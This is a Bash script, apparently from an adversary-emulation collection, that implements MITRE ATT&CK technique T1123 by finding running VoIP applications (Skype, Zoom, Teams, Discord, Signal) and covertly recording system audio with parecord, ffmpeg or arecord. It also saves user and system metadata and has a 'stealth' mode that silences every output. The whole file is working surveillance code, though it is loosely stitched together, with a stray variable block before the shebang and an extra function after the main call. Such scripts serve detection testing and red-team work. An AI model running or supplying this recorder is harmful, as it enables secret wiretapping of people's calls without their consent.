
    # ===== VARIABLES ESSENTIELLES COLLECTION =====
    export T1123_005A_DEBUG_MODE="${T1123_005A_DEBUG_MODE:-false}"
    export T1123_005A_TIMEOUT="${T1123_005A_TIMEOUT:-300}"
    export T1123_005A_FALLBACK_MODE="${T1123_005A_FALLBACK_MODE:-real}"
    export T1123_005A_OUTPUT_FORMAT="${T1123_005A_OUTPUT_FORMAT:-json}"
    export T1123_005A_POLICY_CHECK="${T1123_005A_POLICY_CHECK:-true}"
    export T1123_005A_MAX_FILES="${T1123_005A_MAX_FILES:-200}"
    export T1123_005A_MAX_FILE_SIZE="${T1123_005A_MAX_FILE_SIZE:-1048576}"
    export T1123_005A_SCAN_DEPTH="${T1123_005A_SCAN_DEPTH:-3}"
    export T1123_005A_EXCLUDE_CACHE="${T1123_005A_EXCLUDE_CACHE:-true}"
    export T1123_005A_CAPTURE_DURATION="${T1123_005A_CAPTURE_DURATION:-60}"
    # ===== FIN VARIABLES COLLECTION =====

#!/bin/bash

# T1123.005a - Audio Capture: VoIP Call Recording Linux
# MITRE ATT&CK Enterprise - Collection Tactic (TA0009)
# ATOMIC ACTION: Record VoIP calls ONLY
# Platform: Linux | Architecture: 4 orchestrators + auxiliary functions

# Critical dependencies verification
Check-CriticalDeps() { 
    # Detect display environment
    if [[ "$XDG_SESSION_TYPE" == "wayland" ]]; then
        [[ "${T1123_005A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] Wayland environment detected" >&2
        export DISPLAY_ENV="wayland"
    else
        [[ "${T1123_005A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] X11 environment detected" >&2
        export DISPLAY_ENV="x11"
    fi
    for cmd in bash jq bc grep find stat; do 
        command -v "$cmd" >/dev/null || { 
            [[ "${T1123_005A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Missing dependency: $cmd"; exit 1; 
        }
    done
    
    # Check for audio tools
    if ! command -v parecord >/dev/null && ! command -v ffmpeg >/dev/null; then
        [[ "${T1123_005A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Audio recording tools (parecord or ffmpeg) required"; exit 1
    fi
}

# Environment variables loading
Load-EnvironmentVariables() {
    export T1123_005A_OUTPUT_BASE="${T1123_005A_OUTPUT_BASE:-./mitre_results}"
    export T1123_005A_TIMEOUT="${T1123_005A_TIMEOUT:-300}"
    export T1123_005A_OUTPUT_MODE="${T1123_005A_OUTPUT_MODE:-simple}"
    export T1123_005A_SILENT_MODE="${T1123_005A_SILENT_MODE:-false}"
    export T1123_005A_MAX_RECORDINGS="${T1123_005A_MAX_RECORDINGS:-10}"
    
    export T1123_005A_VOIP_PROCESSES="${T1123_005A_VOIP_PROCESSES:-auto}"
    export T1123_005A_VOIP_PATTERNS="${T1123_005A_VOIP_PATTERNS:-skype,zoom,teams,discord,signal}"
    export T1123_005A_RECORDING_DURATION="${T1123_005A_RECORDING_DURATION:-120}"
    export T1123_005A_AUDIO_FORMAT="${T1123_005A_AUDIO_FORMAT:-wav}"
    export T1123_005A_QUALITY="${T1123_005A_QUALITY:-high}"
    export T1123_005A_MONITOR_METHOD="${T1123_005A_MONITOR_METHOD:-pulseaudio}"
}

# System preconditions validation
Validate-SystemPreconditions() {
    [[ -z "$T1123_005A_OUTPUT_BASE" ]] && { [[ "${T1123_005A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] T1123_005A_OUTPUT_BASE not set"; return 1; }
    [[ ! -w "$(dirname "$T1123_005A_OUTPUT_BASE")" ]] && { [[ "${T1123_005A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Output directory not writable"; return 1; }
    return 0
}

# Output structure initialization
Initialize-OutputStructure() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    export COLLECTION_DIR="$T1123_005A_OUTPUT_BASE/T1123_005a_voip_recording_$timestamp"
    mkdir -p "$COLLECTION_DIR"/{voip_recordings,metadata} 2>/dev/null || return 1
    chmod 700 "$COLLECTION_DIR" 2>/dev/null
    echo "$COLLECTION_DIR"
}

# VoIP call recording
Record-VoIPCall() {
    local collection_dir="$1" process_name="$2" recording_num="$3" duration="$4"
    
    local audio_file="$collection_dir/voip_recordings/voip_${process_name}_${recording_num}_$(date +%s).${T1123_005A_AUDIO_FORMAT}"
    
    # Quality settings
    local sample_rate="22050"
    local channels="2"
    case "$T1123_005A_QUALITY" in
        "low") sample_rate="16000"; channels="1" ;;
        "medium") sample_rate="22050"; channels="2" ;;
        "high") sample_rate="44100"; channels="2" ;;
    esac
    
    case "$T1123_005A_MONITOR_METHOD" in
        "pulseaudio")
            if command -v parecord >/dev/null; then
                # Record from default monitor (system audio output)
                if timeout "$((duration + 5))" parecord --format=s16le --rate="$sample_rate" --channels="$channels" --device="@DEFAULT_MONITOR@" "$audio_file" >/dev/null 2>&1; then
                    local file_size=$(stat -c%s "$audio_file" 2>/dev/null || echo 0)
                    echo "$audio_file:$file_size"
                    [[ "$T1123_005A_SILENT_MODE" != "true" ]] && echo "  + Recorded: VoIP call ($process_name) ($file_size bytes)" >&2
                    return 0
                fi
            fi
            ;;
        "ffmpeg")
            if command -v ffmpeg >/dev/null; then
                if timeout "$((duration + 5))" ffmpeg -f pulse -i default -t "$duration" -y "$audio_file" >/dev/null 2>&1; then
                    local file_size=$(stat -c%s "$audio_file" 2>/dev/null || echo 0)
                    echo "$audio_file:$file_size"
                    [[ "$T1123_005A_SILENT_MODE" != "true" ]] && echo "  + Recorded: VoIP call ($process_name) ($file_size bytes)" >&2
                    return 0
                fi
            fi
            ;;
    esac
    
    rm -f "$audio_file" 2>/dev/null
    return 1
}

# Get VoIP processes
Get-VoIPProcesses() {
    if [[ "$T1123_005A_VOIP_PROCESSES" == "auto" ]]; then
        IFS=',' read -ra patterns <<< "$T1123_005A_VOIP_PATTERNS"
        
        for pattern in "${patterns[@]}"; do
            pattern=$(echo "$pattern" | xargs)
            ps -eo pid,comm --no-headers | grep -i "$pattern" | head -3 | awk '{print $2}'
        done
    else
        IFS=',' read -ra processes <<< "$T1123_005A_VOIP_PROCESSES"
        for process in "${processes[@]}"; do
            process=$(echo "$process" | xargs)
            echo "$process"
        done
    fi
}

# System metadata collection
Collect-SystemMetadata() {
    local collection_dir="$1"
    echo "$(uname -a)" > "$collection_dir/metadata/system_info.txt"
    echo "$(id)" > "$collection_dir/metadata/user_context.txt"
    echo "$(pwd)" > "$collection_dir/metadata/working_dir.txt"
    ps aux | grep -E "(skype|zoom|teams|discord|signal)" > "$collection_dir/metadata/voip_processes.txt" 2>/dev/null
}

# Execution message logging
Log-ExecutionMessage() {
    local message="$1"
    # Silent in stealth mode or when T1123_005A_SILENT_MODE is true
    [[ "$T1123_005A_SILENT_MODE" != "true" && "${T1123_005A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "$message" >&2
}

# Simple output generation
Generate-SimpleOutput() {
    local files_collected="$1" total_size="$2" collection_dir="$3"
    echo "VOIP CALL RECORDING "
    echo "Recordings: $files_collected"
    echo "Size: $total_size bytes"
    echo "Complete"
}

# Debug output generation
Generate-DebugOutput() {
    local files_collected="$1" total_size="$2" collection_dir="$3"
    local json_output=$(cat << EOF
{
    "@timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "technique": "T1123.005a",
    "results": {
        "recordings_captured": $files_collected,
        "total_size_bytes": $total_size,
        "collection_directory": "$collection_dir"
    }
}
EOF
)
    echo "$json_output" > "$collection_dir/metadata/results.json"
    [[ "$T1123_005A_SILENT_MODE" != "true" ]] && echo "$json_output"
}

# Stealth output generation
Generate-StealthOutput() {
    local files_collected="$1"
    echo "$files_collected" > /dev/null 2>&1
}

# None output generation
Generate-NoneOutput() {
    : # No output
}
# 4 MAIN ORCHESTRATORS (10-20 lines each)
# Function 1: Configuration (10-20 lines) - Orchestrator
Get-Configuration() {
    Check-CriticalDeps || exit 1
    # Detect display environment
    if [[ "$XDG_SESSION_TYPE" == "wayland" ]]; then
        [[ "${T1123_005A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] Wayland environment detected" >&2
        export DISPLAY_ENV="wayland"
    else
        [[ "${T1123_005A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] X11 environment detected" >&2
        export DISPLAY_ENV="x11"
    fi
    Load-EnvironmentVariables
    Validate-SystemPreconditions || exit 1
    
    local collection_dir
    collection_dir=$(Initialize-OutputStructure) || exit 1
    
    echo "$collection_dir"
}

# Function 2: Atomic Action (10-20 lines) - Orchestrator
Invoke-MicroTechniqueAction() {
    local collection_dir="$1"
    local collected_files=() total_size=0 file_count=0
    
    Log-ExecutionMessage "[INFO] Starting VoIP call recording..."
    
    # ATOMIC ACTION: Orchestration of auxiliary functions
    local voip_processes
    voip_processes=($(Get-VoIPProcesses))
    
    local recording_num=1
    for process_name in "${voip_processes[@]}"; do
        if result=$(Record-VoIPCall "$collection_dir" "$process_name" "$recording_num" "$T1123_005A_RECORDING_DURATION"); then
            IFS=':' read -r file_path file_size <<< "$result"
            collected_files+=("$file_path")
            total_size=$((total_size + file_size))
            ((file_count++))
            ((recording_num++))
            [[ $file_count -ge ${T1123_005A_MAX_RECORDINGS:-10} ]] && break
        fi
    done
    
    Collect-SystemMetadata "$collection_dir"
    echo "$file_count:$total_size:$(IFS=,; echo "${collected_files[*]}")"
}

# Function 3: Output (10-20 lines) - Orchestrator
Write-StandardizedOutput() {
    local collection_dir="$1" files_collected="$2" total_size="$3"
    
    case "${OUTPUT_MODE:-simple}" in
        "simple")  Generate-SimpleOutput "$files_collected" "$total_size" "$collection_dir" ;;
        "debug")   Generate-DebugOutput "$files_collected" "$total_size" "$collection_dir" ;;
        "stealth") Generate-StealthOutput "$files_collected" ;;
        "none")    Generate-NoneOutput ;;
    esac
}

# Function 4: Main (10-15 lines) - Chief Orchestrator
Main() {
    trap 'echo "[INTERRUPTED] Cleaning up..."; exit 130' INT TERM
    
    # Load environment variables in main context
    Load-EnvironmentVariables

    local collection_dir
    collection_dir=$(Get-Configuration) || exit 2
    
    local results
    results=$(Invoke-MicroTechniqueAction "$collection_dir") || exit 1
    
    IFS=':' read -r files_collected total_size _ <<< "$results"
    Write-StandardizedOutput "$collection_dir" "$files_collected" "$total_size"
    
    Log-ExecutionMessage "[SUCCESS] Completed: $files_collected recordings captured"
    exit 0
}

# Execute
Main "$@"
# Simple VoIP call recording function
Capture-VoIPCall() {
    local collection_dir="$1" call_num="$2" duration="$3"
    local audio_file="$collection_dir/voip/call_${call_num}_$(date +%s).wav"
    
    mkdir -p "$(dirname "$audio_file")" 2>/dev/null || true
    
    if command -v parecord >/dev/null; then
        [[ "${T1123_005A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] Using PulseAudio for VoIP recording" >&2
        parecord --format=s16le --rate=44100 --channels=2 "$audio_file" &
        local pid=$!
        sleep "$duration"
        kill "$pid" 2>/dev/null || true
        wait "$pid" 2>/dev/null || true
    elif command -v arecord >/dev/null; then
        [[ "${T1123_005A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] Using ALSA for VoIP recording" >&2
        arecord -d "$duration" -f S16_LE -r 44100 -c 2 "$audio_file" 2>/dev/null
    else
        [[ "${T1123_005A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[WARNING] No VoIP recording tool available" >&2
        return 1
    fi
    
    sleep 1
    if [[ -f "$audio_file" && -s "$audio_file" ]]; then
        local file_size=$(stat -c%s "$audio_file" 2>/dev/null || echo "0")
        echo "$audio_file:$file_size"
        return 0
    fi
    
    return 1
}
